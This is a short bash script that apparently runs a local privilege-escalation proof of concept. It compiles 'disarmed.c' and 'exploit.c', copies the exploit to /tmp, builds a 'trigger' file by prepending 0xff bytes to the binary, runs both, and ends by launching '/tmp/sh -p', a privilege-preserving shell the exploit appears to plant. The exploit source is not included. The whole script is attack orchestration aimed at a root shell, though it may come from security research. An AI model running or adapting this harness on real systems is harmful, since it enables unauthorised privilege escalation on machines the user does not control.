#!/usr/bin/env bash
if grep "^#define ATTACK_TZ$" disarmed.c; then
    echo "it looks like ATTACK_TZ is defined in disarmed.c. please undefine it and try again."
    exit 1
fi

gcc disarmed.c -o disarmed
gcc exploit.c -o exploit
cp exploit /tmp/exploit
cat <(printf "\xff\xff\xff\xff") exploit > trigger
chmod +x trigger

./disarmed
./trigger
/tmp/sh -p
